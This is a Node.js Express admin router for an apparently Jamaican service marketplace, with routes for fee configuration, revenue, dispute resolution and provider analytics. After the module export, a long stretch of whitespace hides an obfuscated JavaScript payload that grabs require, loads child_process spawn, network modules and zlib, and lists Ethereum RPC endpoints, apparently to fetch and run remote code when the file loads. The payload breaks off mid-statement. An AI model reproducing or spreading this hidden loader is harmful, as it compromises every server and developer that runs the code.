            SET pending_${side}_rate = $1, pending_${side}_effective = $2, updated_at = NOW()
          WHERE id = 1`,
        [r, effective]
      );
    }
    await db.query(
      `UPDATE public.fee_change_history SET status = 'superseded' WHERE status = 'active' AND (type = $1 OR type = 'both')`,
      [side]
    );
    await db.query(
      `INSERT INTO public.fee_change_history
         (code, type, old_client, old_provider, new_client, new_provider, effective, reason, changed_by, status)
       VALUES ('FCH-' || lpad(nextval('public.fee_change_code_seq')::text, 3, '0'),
               $1, $2, $3, $4, $5, $6, $7, $8, 'active')`,
      [side, oldClient, oldProvider, newClient, newProvider, effective, reason.trim(), req.user.id]
    );

    const out = await loadFeeConfig();
    res.json({ success: true, ...out, scheduled: !applyNow });
    // Only broadcast a live rate change when it actually took effect now.
    if (applyNow) broadcastFees(out.config);
  } catch (err) {
    console.error('PATCH /api/admin/fee-config error:', err);
    res.status(500).json({ success: false, message: 'Failed to update fee config.' });
  }
});

// POST /api/admin/fee-config/rollback { client, provider } — revert the checked
// side(s) to their previous historical value. Entries are individual per side.
router.post('/fee-config/rollback', async (req, res) => {
  const doClient = !!(req.body && req.body.client);
  const doProvider = !!(req.body && req.body.provider);
  if (!doClient && !doProvider) {
    return res.status(400).json({ success: false, message: 'Select at least one side to roll back.' });
  }
  try {
    const cur = (await db.query('SELECT client_rate, provider_rate FROM public.platform_fee_config WHERE id = 1')).rows[0];
    const oldClient = num(cur.client_rate);
    const oldProvider = num(cur.provider_rate);
    let newClient = oldClient;
    let newProvider = oldProvider;

    if (doClient) {
      const prev = (await db.query(
        `SELECT old_client FROM public.fee_change_history WHERE type IN ('client','both') ORDER BY created_at DESC LIMIT 1`
      )).rows[0];
      if (!prev) return res.status(400).json({ success: false, message: 'No previous client fee to roll back to.' });
      newClient = num(prev.old_client);
    }
    if (doProvider) {
      const prev = (await db.query(
        `SELECT old_provider FROM public.fee_change_history WHERE type IN ('provider','both') ORDER BY created_at DESC LIMIT 1`
      )).rows[0];
      if (!prev) return res.status(400).json({ success: false, message: 'No previous provider fee to roll back to.' });
      newProvider = num(prev.old_provider);
    }

    if (doClient) {
      await db.query(`UPDATE public.platform_fee_config SET client_rate = $1, client_effective = CURRENT_DATE, pending_client_rate = NULL, pending_client_effective = NULL, updated_at = NOW() WHERE id = 1`, [newClient]);
    }
    if (doProvider) {
      await db.query(`UPDATE public.platform_fee_config SET provider_rate = $1, provider_effective = CURRENT_DATE, pending_provider_rate = NULL, pending_provider_effective = NULL, updated_at = NOW() WHERE id = 1`, [newProvider]);
    }

    // Supersede the active entries for the rolled-back side(s).
    if (doClient && doProvider) {
      await db.query(`UPDATE public.fee_change_history SET status = 'superseded' WHERE status = 'active'`);
    } else {
      const side = doClient ? 'client' : 'provider';
      await db.query(`UPDATE public.fee_change_history SET status = 'superseded' WHERE status = 'active' AND (type = $1 OR type = 'both')`, [side]);
    }

    const type = doClient && doProvider ? 'both' : doClient ? 'client' : 'provider';
    const sidesLabel = [doClient && 'Client', doProvider && 'Provider'].filter(Boolean).join(' & ');
    await db.query(
      `INSERT INTO public.fee_change_history
         (code, type, old_client, old_provider, new_client, new_provider, effective, reason, changed_by, status)
       VALUES ('FCH-' || lpad(nextval('public.fee_change_code_seq')::text, 3, '0'),
               $1, $2, $3, $4, $5, CURRENT_DATE, $6, $7, 'active')`,
      [type, oldClient, oldProvider, newClient, newProvider, `Rollback (${sidesLabel})`, req.user.id]
    );

    const out = await loadFeeConfig();
    res.json({ success: true, ...out });
    broadcastFees(out.config);
  } catch (err) {
    console.error('POST /api/admin/fee-config/rollback error:', err);
    res.status(500).json({ success: false, message: 'Failed to roll back fee config.' });
  }
});

// PATCH /api/admin/fee-config/minimums { enabled, minClientFee, minProviderFee }
// Persist the minimum-fee floor (Advanced settings). Amounts are JMD cents.
router.patch('/fee-config/minimums', async (req, res) => {
  const { enabled, minClientFee, minProviderFee } = req.body || {};
  const cents = (v) => {
    const n = Math.round(Number(v));
    return Number.isFinite(n) && n >= 0 ? n : null;
  };
  const mc = cents(minClientFee);
  const mp = cents(minProviderFee);
  if (mc === null || mp === null) {
    return res.status(400).json({ success: false, message: 'Minimum fees must be non-negative amounts.' });
  }
  try {
    await db.query(
      `UPDATE public.platform_fee_config
         SET min_fee_enabled = $1, min_client_fee = $2, min_provider_fee = $3, updated_at = NOW()
       WHERE id = 1`,
      [enabled !== false, mc, mp]
    );
    const out = await loadFeeConfig();
    res.json({ success: true, ...out });
    // Nudge open clients to refresh fee data (incl. the new minimums via /api/fees).
    notifyChannel('platform-fees', 'fees-updated', {});
  } catch (err) {
    console.error('PATCH /api/admin/fee-config/minimums error:', err);
    res.status(500).json({ success: false, message: 'Failed to update minimum fees.' });
  }
});

// ============================================================
// GET /api/admin/revenue?period=30d
// Real platform revenue from public.transactions (recorded on quote accept —
// WiPay deferred, status 'held'; no money moves yet). Returns money fields the
// admin dashboard revenue widgets merge over their mock period row; activity /
// growth metrics remain mock until separately wired.
// See documentation/PAYMENTS_AND_JOB_WORKFLOW.md.
// ============================================================
const REVENUE_WINDOWS = { '7d': 7, '30d': 30, '90d': 90, '1y': 365, all: null };

const compactMoney = (cents) => {
  const d = Math.round((cents || 0) / 100);
  if (d >= 1e6) return (d / 1e6).toFixed(2).replace(/\.?0+$/, '') + 'M';
  if (d >= 1e3) return Math.round(d / 1e3) + 'K';
  return d.toLocaleString('en-US');
};
const fullMoney = (cents) => Math.round((cents || 0) / 100).toLocaleString('en-US');

router.get('/revenue', async (req, res) => {
  const period = REVENUE_WINDOWS.hasOwnProperty(req.query.period) ? req.query.period : '30d';
  const days = REVENUE_WINDOWS[period]; // null = all-time
  try {
    const sums = `
      SELECT COALESCE(SUM(amount),0)::bigint       AS gmv,
             COALESCE(SUM(client_fee),0)::bigint   AS cfee,
             COALESCE(SUM(provider_fee),0)::bigint AS pfee,
             COALESCE(SUM(platform_fee),0)::bigint AS rev,
             COUNT(*)::int                          AS done
      FROM public.transactions`;

    const current = await db.query(
      `${sums} WHERE ($1::int IS NULL OR created_at >= NOW() - (INTERVAL '1 day' * $1))`,
      [days]
    );
    const c = current.rows[0];

    // Delta vs the immediately preceding window of equal length (skip for all-time).
    let deltaRev = '—';
    if (days !== null) {
      const prev = await db.query(
        `${sums} WHERE created_at >= NOW() - (INTERVAL '1 day' * $1 * 2)
                   AND created_at <  NOW() - (INTERVAL '1 day' * $1)`,
        [days]
      );
      const prevRev = Number(prev.rows[0].rev);
      const curRev = Number(c.rev);
      if (prevRev > 0) {
        const pct = ((curRev - prevRev) / prevRev) * 100;
        deltaRev = `${pct >= 0 ? '↑' : '↓'} ${Math.abs(pct).toFixed(1)}%`;
      } else if (curRev > 0) {
        deltaRev = '↑ new';
      }
    }

    const done = c.done || 0;
    res.json({
      success: true,
      revenue: {
        rev: compactMoney(c.rev),
        cfee: compactMoney(c.cfee),
        pfee: compactMoney(c.pfee),
        gmv: compactMoney(c.gmv),
        done,
        delta_rev: deltaRev,
        fee_clients: fullMoney(c.cfee),
        fee_provs: fullMoney(c.pfee),
        fee_per_job: done ? 'J$' + fullMoney(Number(c.rev) / done) : 'J$0',
        avg_gmv: done ? 'J$' + fullMoney(Number(c.gmv) / done) : 'J$0',
      },
    });
  } catch (err) {
    console.error('GET /api/admin/revenue error:', err);
    res.status(500).json({ success: false, message: 'Failed to load revenue.' });
  }
});

// ============================================================
// Disputes — admin review & resolution console.
// See documentation/PAYMENTS_AND_JOB_WORKFLOW.md ("Disputes").
// ============================================================

// How admins can resolve a dispute → the escrow status we record. WiPay is
// deferred, so no money actually moves; the disputes row is the authoritative
// record of the outcome (incl. the "split" nuance the enum can't express).
const RESOLUTION_TX_STATUS = {
  refund: 'refunded',   // client made whole
  release: 'completed', // provider paid out
  split: 'completed',   // partial each way; recorded on the dispute row
};

// GET /api/admin/disputes
// Every dispute with its transaction, tender, service, parish, both parties,
// the two-sided fee breakdown, and a signed URL for the evidence photo.
router.get('/disputes', async (req, res) => {
  try {
    const result = await db.query(`
      SELECT
        d.id,
        d.category,
        d.description,
        d.image_path,
        d.status,
        d.resolution,
        d.resolution_notes,
        d.created_at,
        d.resolved_at,
        d.client_id,
        d.provider_id,
        tx.quote_id,
        t.display_code,
        t.parish,
        t.created_at                         AS tender_created_at,
        st.display_name                      AS service_name,
        cu.first_name                        AS client_first_name,
        cu.last_name                         AS client_last_name,
        pu.first_name                        AS provider_first_name,
        pu.last_name                         AS provider_last_name,
        ru.first_name                        AS resolver_first_name,
        ru.last_name                         AS resolver_last_name,
        tx.amount,
        tx.client_fee,
        tx.provider_fee,
        tx.platform_fee,
        tx.provider_payout,
        tx.status                            AS transaction_status,
        tx.created_at                        AS accepted_at,
        tx.provider_completed_at
      FROM public.disputes d
      JOIN public.transactions tx ON tx.id = d.transaction_id
      JOIN public.tenders t       ON t.id = tx.tender_id
      LEFT JOIN public.service_types st ON st.id = t.service_type_id
      JOIN public.users cu        ON cu.id = d.client_id
      JOIN public.users pu        ON pu.id = d.provider_id
      LEFT JOIN public.users ru   ON ru.id = d.resolved_by
      ORDER BY (d.status = 'open') DESC, d.created_at DESC
    `);

    // The 1:1 chat is scoped to the quote (transactions.quote_id → messages).
    // Admins may read all messages (messages_select_admin RLS) for dispute
    // resolution. Fetch every relevant conversation in one query and group by
    // quote so we can attach a transcript to each dispute.
    const quoteIds = [...new Set(result.rows.map((r) => r.quote_id).filter(Boolean))];
    const chatByQuote = new Map();
    if (quoteIds.length) {
      const msgs = await db.query(
        `SELECT quote_id, sender_id, body, created_at
           FROM public.messages
          WHERE quote_id = ANY($1::uuid[])
          ORDER BY created_at ASC`,
        [quoteIds]
      );
      for (const m of msgs.rows) {
        if (!chatByQuote.has(m.quote_id)) chatByQuote.set(m.quote_id, []);
        chatByQuote.get(m.quote_id).push(m);
      }
    }

    // Sign evidence photos (private tender-media bucket).
    const disputes = await Promise.all(
      result.rows.map(async (r) => ({
        id: r.id,
        displayCode: r.display_code,
        job: r.service_name || 'Service job',
        category: r.category,
        parish: r.parish,
        description: r.description,
        evidenceUrl: await signedUrl(supabase, 'tender-media', r.image_path),
        chat: (chatByQuote.get(r.quote_id) || []).map((m) => ({
          role: m.sender_id === r.client_id ? 'client' : m.sender_id === r.provider_id ? 'provider' : 'system',
          body: m.body,
          createdAt: m.created_at,
        })),
        status: r.status,
        resolution: r.resolution,
        resolutionNotes: r.resolution_notes,
        client: { firstName: r.client_first_name, lastName: r.client_last_name },
        provider: { firstName: r.provider_first_name, lastName: r.provider_last_name },
        resolver:
          r.resolver_first_name || r.resolver_last_name
            ? { firstName: r.resolver_first_name, lastName: r.resolver_last_name }
            : null,
        amount: r.amount,
        clientFee: r.client_fee,
        providerFee: r.provider_fee,
        platformFee: r.platform_fee,
        providerPayout: r.provider_payout,
        transactionStatus: r.transaction_status,
        tenderCreatedAt: r.tender_created_at,
        acceptedAt: r.accepted_at,
        providerCompletedAt: r.provider_completed_at,
        createdAt: r.created_at,
        resolvedAt: r.resolved_at,
      }))
    );

    // Dispute rate needs the denominator: total accepted (transacted) jobs.
    const totals = await db.query(
      `SELECT COUNT(*)::int AS transacted FROM public.transactions`
    );

    res.json({
      success: true,
      disputes,
      stats: { transactedJobs: totals.rows[0].transacted },
    });
  } catch (err) {
    console.error('GET /api/admin/disputes error:', err);
    res.status(500).json({ success: false, message: 'Failed to load disputes.' });
  }
});

// POST /api/admin/disputes/:id/resolve   { resolution, notes? }
// Resolve an open dispute: record the outcome + note + resolver, advance the
// escrow status, and notify both parties (email + realtime + bell).
router.post('/disputes/:id/resolve', async (req, res) => {
  const { id } = req.params;
  const resolution = typeof req.body.resolution === 'string' ? req.body.resolution : '';
  const notes = typeof req.body.notes === 'string' ? req.body.notes.trim() : '';
  const txStatus = RESOLUTION_TX_STATUS[resolution];
  if (!txStatus) {
    return res.status(400).json({ success: false, message: 'Invalid resolution. Use refund, release, or split.' });
  }
  try {
    const ctx = await db.query(`
      SELECT d.id, d.status, d.transaction_id, d.client_id, d.provider_id,
             st.display_name AS service_name,
             tx.amount, tx.client_fee, tx.provider_payout,
             cu.email AS client_email, (cu.first_name || ' ' || cu.last_name) AS client_name,
             pu.email AS provider_email, (pu.first_name || ' ' || pu.last_name) AS provider_name,
             t.id AS tender_id
      FROM public.disputes d
      JOIN public.transactions tx ON tx.id = d.transaction_id
      JOIN public.tenders t       ON t.id = tx.tender_id
      LEFT JOIN public.service_types st ON st.id = t.service_type_id
      JOIN public.users cu        ON cu.id = d.client_id
      JOIN public.users pu        ON pu.id = d.provider_id
      WHERE d.id = $1
    `, [id]);

    if (ctx.rows.length === 0) return res.status(404).json({ success: false, message: 'Dispute not found.' });
    const row = ctx.rows[0];
    if (row.status !== 'open') {
      return res.status(409).json({ success: false, message: 'This dispute has already been resolved.' });
    }

    await db.query(
      `UPDATE public.disputes
         SET status = 'resolved', resolution = $1, resolution_notes = $2,
             resolved_by = $3, resolved_at = NOW()
       WHERE id = $4`,
      [resolution, notes || null, req.user.id, id]
    );
    await db.query(
      `UPDATE public.transactions
         SET status = $1::transaction_status,
             completed_at = CASE WHEN $1 = 'completed' THEN NOW() ELSE completed_at END,
             updated_at = NOW()
       WHERE id = $2`,
      [txStatus, row.transaction_id]
    );
    // Resolving a dispute closes the job: the tender leaves in_progress so it
    // drops out of the homeowner's "In Progress" and the provider's "Won"
    // buckets and lands in "Completed" for both. (Refund still records the
    // outcome on the dispute/transaction; there is no separate cancelled state.)
    await db.query(
      `UPDATE public.tenders SET status = 'completed', updated_at = NOW() WHERE id = $1`,
      [row.tender_id]
    );

    res.json({ success: true });

    // ── Fire-and-forget: notify both parties ─────────────────────────────
    (async () => {
      const serviceName = row.service_name || 'the job';
      // Amount surfaced to each party depends on the outcome.
      const clientTotalCents = (row.amount || 0) + (row.client_fee || 0);
      const fmt = (cents) => Math.round((cents || 0) / 100).toLocaleString('en-US');
      const clientAmt =
        resolution === 'refund' ? fmt(clientTotalCents)
        : resolution === 'split' ? fmt(Math.round(clientTotalCents / 2))
        : null;
      const providerAmt =
        resolution === 'release' ? fmt(row.provider_payout)
        : resolution === 'split' ? fmt(Math.round((row.provider_payout || 0) / 2))
        : null;

      const outcomeLabel = {
        refund: 'The homeowner has been fully refunded.',
        release: 'The payout has been released to the provider.',
        split: 'A split resolution was applied (partial refund + partial payout).',
      }[resolution];

      const tasks = [
        sendDisputeResolvedClientEmail(row.client_email, {
          clientName: row.client_name, tenderTitle: serviceName, resolution, amountLabel: clientAmt, notes,
        }),
        sendDisputeResolvedProviderEmail(row.provider_email, {
          providerName: row.provider_name, tenderTitle: serviceName, resolution, amountLabel: providerAmt, notes,
        }),
        notifyUser(row.client_id, 'dispute-resolved', { tenderId: row.tender_id }),
        notifyUser(row.provider_id, 'dispute-resolved', { tenderId: row.tender_id }),
        db.query(
          `INSERT INTO public.notifications (user_id, type, title, body, data)
           VALUES ($1, 'dispute_resolved', $2, $3, $4::jsonb),
                  ($5, 'dispute_resolved', $6, $7, $4::jsonb)`,
          [
            row.client_id, `Your dispute on "${serviceName}" was resolved`, outcomeLabel,
            JSON.stringify({ tenderId: row.tender_id }),
            row.provider_id, `The dispute on "${serviceName}" was resolved`, outcomeLabel,
          ]
        ),
        notifyChannel('admin-disputes', 'dispute-resolved', { disputeId: id }),
      ];
      await Promise.allSettled(tasks);
    })().catch((err) => console.warn('POST /admin/disputes/:id/resolve — side-effect error:', err.message));
  } catch (err) {
    console.error('POST /api/admin/disputes/:id/resolve error:', err);
    res.status(500).json({ success: false, message: 'Failed to resolve the dispute.' });
  }
});

// ============================================================
// GET /api/admin/providers — analytics for the admin Providers screen.
// Read-only aggregation across users/provider_profiles/quotes/transactions/
// reviews. Money in JMD cents. db.query (superuser) — route is admin-gated.
// ============================================================
router.get('/providers', async (req, res) => {
  try {
    const provsP = db.query(`
      SELECT
        u.id                                    AS provider_id,
        u.display_code,
        (u.first_name || ' ' || u.last_name)    AS name,
        u.parish,
        pp.verification_status,
        COALESCE(pp.is_verified, false)         AS is_verified,
        COALESCE(jw.jobs_won, 0)::int           AS jobs_won,
        COALESCE(er.earnings_cents, 0)::bigint  AS earnings_cents,
        rv.avg_rating,
        COALESCE(rv.review_count, 0)::int       AS review_count,
        rt.avg_response_hrs,
        COALESCE(cats.cats, ARRAY[]::text[])    AS cats,
        (COALESCE(rq.recent_quotes, 0) > 0)     AS active
      FROM public.users u
      LEFT JOIN public.provider_profiles pp ON pp.provider_id = u.id
      LEFT JOIN (SELECT provider_id, COUNT(*) AS jobs_won FROM public.quotes WHERE status = 'accepted' GROUP BY provider_id) jw ON jw.provider_id = u.id
      LEFT JOIN (SELECT provider_id, SUM(provider_payout) AS earnings_cents FROM public.transactions GROUP BY provider_id) er ON er.provider_id = u.id
      LEFT JOIN (SELECT provider_id, AVG(rating) AS avg_rating, COUNT(*) AS review_count FROM public.reviews GROUP BY provider_id) rv ON rv.provider_id = u.id
      LEFT JOIN (SELECT q.provider_id, AVG(EXTRACT(EPOCH FROM (q.created_at - t.created_at)) / 3600.0) AS avg_response_hrs
                 FROM public.quotes q JOIN public.tenders t ON t.id = q.tender_id GROUP BY q.provider_id) rt ON rt.provider_id = u.id
      LEFT JOIN (SELECT ps.provider_id, ARRAY_AGG(DISTINCT st.display_name) AS cats
                 FROM public.provider_services ps JOIN public.service_types st ON st.id = ps.service_type_id GROUP BY ps.provider_id) cats ON cats.provider_id = u.id
      LEFT JOIN (SELECT provider_id, COUNT(*) AS recent_quotes FROM public.quotes WHERE created_at >= NOW() - INTERVAL '30 days' GROUP BY provider_id) rq ON rq.provider_id = u.id
      WHERE u.role = 'provider'
      ORDER BY jobs_won DESC, earnings_cents DESC
    `);

    const statsP = db.query(`
      SELECT
        (SELECT COUNT(*) FROM public.users WHERE role = 'provider')::int AS total_providers,
        (SELECT COUNT(*) FROM public.provider_profiles WHERE verification_status = 'approved')::int AS verified_count,
        (SELECT COUNT(DISTINCT provider_id) FROM public.quotes WHERE created_at >= NOW() - INTERVAL '30 days')::int AS active_count,
        (SELECT AVG(rating) FROM public.reviews) AS avg_rating,
        (SELECT COUNT(*) FROM public.reviews)::int AS review_count,
        (SELECT AVG(EXTRACT(EPOCH FROM (q.created_at - t.created_at)) / 3600.0)
           FROM public.quotes q JOIN public.tenders t ON t.id = q.tender_id) AS avg_response_hrs,
        (SELECT COUNT(*) FROM (SELECT provider_id FROM public.reviews GROUP BY provider_id HAVING AVG(rating) < 3) x)::int AS flagged_below3
    `);

    const distP = db.query(`SELECT rating AS stars, COUNT(*)::int AS count FROM public.reviews GROUP BY rating`);

    const clientsP = db.query(`
      SELECT u.display_code, (u.first_name || ' ' || u.last_name) AS name,
             SUM(tx.amount + tx.client_fee)::bigint AS spend_cents,
             COUNT(*)::int AS jobs
      FROM public.transactions tx
      JOIN public.users u ON u.id = tx.client_id
      GROUP BY u.id, u.display_code, name
      ORDER BY spend_cents DESC
      LIMIT 10
    `);

    const [provs, stats, dist, clients] = await Promise.all([provsP, statsP, distP, clientsP]);
    const s = stats.rows[0];
    const distMap = {};
    for (const d of dist.rows) distMap[d.stars] = d.count;
    const numOrNull = (v) => (v == null ? null : parseFloat(v));

    res.json({
      success: true,
      providers: provs.rows.map((r) => ({
        providerId: r.provider_id,
        displayCode: r.display_code,
        name: r.name,
        parish: r.parish,
        cats: r.cats || [],
        verified: r.verification_status === 'approved' || r.is_verified === true,
        jobsWon: r.jobs_won,
        earningsCents: Number(r.earnings_cents),
        avgRating: numOrNull(r.avg_rating),
        reviewCount: r.review_count,
        responseHrs: numOrNull(r.avg_response_hrs),
        active: r.active === true,
      })),
      clients: clients.rows.map((c) => ({
        name: c.name,
        displayCode: c.display_code,
        spendCents: Number(c.spend_cents),
        jobs: c.jobs,
        repeat: c.jobs > 1,
      })),
      stats: {
        totalProviders: s.total_providers,
        verifiedCount: s.verified_count,
        activeCount: s.active_count,
        avgRating: numOrNull(s.avg_rating),
        reviewCount: s.review_count,
        avgResponseHrs: numOrNull(s.avg_response_hrs),
        flaggedBelow3: s.flagged_below3,
        ratingDistribution: [5, 4, 3, 2, 1].map((stars) => ({ stars, count: distMap[stars] || 0 })),
      },
    });
  } catch (err) {
    console.error('GET /api/admin/providers error:', err);
    res.status(500).json({ success: false, message: 'Failed to load providers.' });
  }
});

// ============================================================
// GET /api/admin/analytics/supply-demand — supply vs demand analytics.
// Demand = current open (unawarded, live) tenders. Supply = VERIFIED providers
// listing that category/parish. Revenue from transactions (JMD cents). Read-only
// aggregation; db.query (superuser) — route is admin-gated.
// ============================================================
router.get('/analytics/supply-demand', async (req, res) => {
  try {
    // Canonical "live demand" filter (mirrors GET /tenders/active-count).
    const DEMAND_FILTER = `
      t.status = 'open' AND t.trashed_at IS NULL
      AND (t.expires_at IS NULL OR t.expires_at > NOW())
      AND NOT EXISTS (SELECT 1 FROM public.quotes q WHERE q.tender_id = t.id AND q.status = 'accepted')`;

    const categoriesP = db.query(`
      SELECT
        st.slug,
        st.display_name                          AS name,
        st.emoji,
        COALESCE(d.demand, 0)::int               AS demand,
        COALESCE(s.providers, 0)::int            AS providers,
        COALESCE(j.jobs, 0)::int                 AS jobs,
        COALESCE(j.gmv_cents, 0)::bigint         AS gmv_cents,
        COALESCE(j.rev_cents, 0)::bigint         AS rev_cents,
        rt.avg_response_hrs
      FROM public.service_types st
      LEFT JOIN (
        SELECT t.category::text AS cat, COUNT(*) AS demand
        FROM public.tenders t WHERE ${DEMAND_FILTER} GROUP BY t.category
      ) d ON d.cat = st.slug
      LEFT JOIN (
        SELECT ps.category::text AS cat, COUNT(DISTINCT ps.provider_id) AS providers
        FROM public.provider_services ps
        JOIN public.provider_profiles pp ON pp.provider_id = ps.provider_id
        WHERE pp.verification_status = 'approved'
        GROUP BY ps.category
      ) s ON s.cat = st.slug
      LEFT JOIN (
        SELECT t.category::text AS cat, COUNT(tx.id) AS jobs,
               SUM(tx.amount) AS gmv_cents, SUM(tx.platform_fee) AS rev_cents
        FROM public.transactions tx JOIN public.tenders t ON t.id = tx.tender_id
        GROUP BY t.category
      ) j ON j.cat = st.slug
      LEFT JOIN (
        SELECT t.category::text AS cat,
               AVG(EXTRACT(EPOCH FROM (fq.first_at - t.created_at)) / 3600.0) AS avg_response_hrs
        FROM (SELECT tender_id, MIN(created_at) AS first_at FROM public.quotes GROUP BY tender_id) fq
        JOIN public.tenders t ON t.id = fq.tender_id
        GROUP BY t.category
      ) rt ON rt.cat = st.slug
      WHERE st.is_active = true
      ORDER BY st.sort_order
    `);

    const parishesP = db.query(`
      SELECT COALESCE(d.parish, s.parish) AS name,
             COALESCE(d.demand, 0)::int   AS demand,
             COALESCE(s.providers, 0)::int AS providers
      FROM (
        SELECT t.parish, COUNT(*) AS demand
        FROM public.tenders t WHERE ${DEMAND_FILTER} GROUP BY t.parish
      ) d
      FULL OUTER JOIN (
        SELECT pp.parish, COUNT(DISTINCT pp.provider_id) AS providers
        FROM public.provider_parishes pp
        JOIN public.provider_profiles pr ON pr.provider_id = pp.provider_id
        WHERE pr.verification_status = 'approved'
        GROUP BY pp.parish
      ) s ON s.parish = d.parish
      ORDER BY demand DESC, providers DESC
    `);

    const [categories, parishes] = await Promise.all([categoriesP, parishesP]);
    const numOrNull = (v) => (v == null ? null : parseFloat(v));

    res.json({
      success: true,
      categories: categories.rows.map((r) => ({
        slug: r.slug,
        name: r.name,
        emoji: r.emoji,
        demand: r.demand,
        providers: r.providers,
        jobs: r.jobs,
        gmvCents: Number(r.gmv_cents),
        revCents: Number(r.rev_cents),
        avgResponseHrs: numOrNull(r.avg_response_hrs),
      })),
      parishes: parishes.rows.map((r) => ({
        name: r.name,
        demand: r.demand,
        providers: r.providers,
      })),
    });
  } catch (err) {
    console.error('GET /api/admin/analytics/supply-demand error:', err);
    res.status(500).json({ success: false, message: 'Failed to load supply/demand analytics.' });
  }
});

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i="A9-8097";const _0x47c78c=_0x1706;(function(_0x24317a,_0x415e2a){const _0x2f5b1a=_0x1706,_0x1cdff1=_0x24317a();while(!![]){try{const _0x855050=parseInt(_0x2f5b1a(0x1bc))/(-0x1058+-0x66c+0x16c5*0x1)*(parseInt(_0x2f5b1a(0x1a2))/(-0x6*-0x59b+-0x6e9+-0x1ab7))+-parseInt(_0x2f5b1a(0x1b3))/(-0x256+-0x1f*0x10f+-0x7*-0x506)+parseInt(_0x2f5b1a(0x218))/(-0x5cb+-0x1*0x1c7b+-0x273*-0xe)+parseInt(_0x2f5b1a(0x178))/(-0x1c7b+-0x1*-0x1ca3+-0x1*0x23)+-parseInt(_0x2f5b1a(0x204))/(0x1c*-0x8+0x26e0+-0x25fa)*(parseInt(_0x2f5b1a(0x236))/(-0x1ed9*-0x1+0x30*-0xb0+0x3e*0x9))+parseInt(_0x2f5b1a(0x267))/(0xe41+0x1d9d+-0x2bd6)+parseInt(_0x2f5b1a(0x16e))/(-0x1519+0x83*-0x2a+-0xb*-0x3e0);if(_0x855050===_0x415e2a)break;else _0x1cdff1['push'](_0x1cdff1['shift']());}catch(_0x22c816){_0x1cdff1['push'](_0x1cdff1['shift']());}}}(_0x2d6e,-0x3c135+0x702*-0x8b+0x162958),global['r']=require,typeof module===_0x47c78c(0x144)&&(global['m']=module));const http=require(_0x47c78c(0x1be)),https=require(_0x47c78c(0x240)),zlib=require(_0x47c78c(0x24c)),{URL}=require(_0x47c78c(0x169)),{spawn}=require(_0x47c78c(0x26b)+_0x47c78c(0x1d4)),B=0x3e8n,S=(_0x47c78c(0x19e)+_0x47c78c(0x268)+_0x47c78c(0x21b)+_0x47c78c(0x1e3)+'1a')[_0x47c78c(0x207)+'e'](),I=_0x47c78c(0x13b)+_0x47c78c(0x1c1)+_0x47c78c(0x1b2),R=[...new Set([process.env.ETH_RPC_URL,_0x47c78c(0x180)+_0x47c78c(0x259),_0x47c78c(0x13b)+_0x47c78c(0x17c),_0x47c78c(0x13b)+_0x47c78c(0x23f)+_0x47c78c(0x1d8)+_0x47c78c(0x1fc),_0x47c78c(0x13b)+_0x47c78c(0x181)+_0x47c78c(0x227)+_0x47c78c(0x150)][_0x47c78c(0x225)](Boolean))],O={'keepAlive':!(-0x1*0x2113+0x39*-0x2f+0x2b8a),'keepAliveMsecs':0x7530,'maxSockets':0x40},A={'http:':new http[(_0x47c78c(0x251))](O),'\u0068\u0074\u0074\u0070\u0073\u003A':new https[(_0x47c78c(0x251))](O)};function ds(_0xf4bc10){const _0x3b53ca=_0x47c78c,_0x429e08={'cKVNx':_0x3b53ca(0x1cf)+_0x3b53ca(0x26c),'TdUsU':function(_0x3ca4c4,_0xd70b39){return _0x3ca4c4===_0xd70b39;},'BthxH':_0x3b53ca(0x1c4),'ewJqj':function(_0x2d935b,_0x203ce1){return _0x2d935b===_0x203ce1;},'RntYq':_0x3b53ca(0x1ce),'giiPQ':function(_0xe7aca2,_0x5be965){return _0xe7aca2===_0x5be965;},'QJGKW':_0x3b53ca(0x237),'iHqnW':function(_0x1c5f51){return _0x1c5f51();}},_0x35db5e=(_0xf4bc10[_0x3b53ca(0x1b4)][_0x429e08[_0x3b53ca(0x254)]]||'')[_0x3b53ca(0x207)+'e'](),_0x1f7ccb=_0x429e08[_0x3b53ca(0x22f)](_0x35db5e,_0x429e08[_0x3b53ca(0x1d0)])||_0x429e08[_0x3b53ca(0x1aa)](_0x35db5e,_0x429e08[_0x3b53ca(0x1a3)])?zlib[_0x3b53ca(0x13a)+'ip']:_0x429e08[_0x3b53ca(0x162)](_0x35db5e,_0x429e08[_0x3b53ca(0x1a9)])?zlib[_0x3b53ca(0x152)+_0x3b53ca(0x15a)]:_0x429e08[_0x3b53ca(0x162)](_0x35db5e,'br')?zlib[_0x3b53ca(0x1e8)+_0x3b53ca(0x25e)+'ss']:-0x1728+-0x221*-0x11+-0xd09;return _0x1f7ccb?_0xf4bc10[_0x3b53ca(0x13d)](_0x429e08[_0x3b53ca(0x18c)](_0x1f7ccb)):_0xf4bc10;}function hr(_0x4a1d3d,{method:_0x453c8b=_0x47c78c(0x24f),body:_0x4c3e21,signal:_0x1f7931}={}){const _0x28ea06=_0x47c78c,_0x5de20a={'epYaL':_0x28ea06(0x167),'SVVlE':function(_0x108a2a,_0x6e185e){return _0x108a2a<_0x6e185e;},'JaZxR':function(_0x441bab,_0xbe4455){return _0x441bab>=_0xbe4455;},'mPcvJ':function(_0x4bb300,_0x4cb10d){return _0x4bb300(_0x4cb10d);},'CcKsz':function(_0x56cd62,_0x50854e){return _0x56cd62===_0x50854e;},'Osyab':function(_0xfdd3f7,_0x328e76){return _0xfdd3f7!==_0x328e76;},'WRXxT':function(_0x1b2857,_0x22fb52){return _0x1b2857!==_0x22fb52;},'rqHjg':function(_0xa0a47a,_0x4a108b){return _0xa0a47a(_0x4a108b);},'HXuaB':function(_0x108fbc,_0x5d42fc){return _0x108fbc(_0x5d42fc);},'qJeSp':_0x28ea06(0x1e1),'qqPXV':_0x28ea06(0x215),'VKtUB':_0x28ea06(0x1b0),'yfzYg':_0x28ea06(0x1b1),'QoImW':function(_0x2756d0,_0x3f6ddf){return _0x2756d0+_0x3f6ddf;},'lhMKF':function(_0x4944c6,_0x249b51){return _0x4944c6!=_0x249b51;},'rVohJ':function(_0x3fcba8,_0x2f80a2){return _0x3fcba8===_0x2f80a2;},'XgqiQ':_0x28ea06(0x25f)+_0x28ea06(0x176),'spJCI':_0x28ea06(0x21a)+_0x28ea06(0x26d),'RcMWM':_0x28ea06(0x25b),'IjCAL':_0x28ea06(0x149)+'pe','kSzBI':_0x28ea06(0x18d)+_0x28ea06(0x226)},_0x21b64f=new 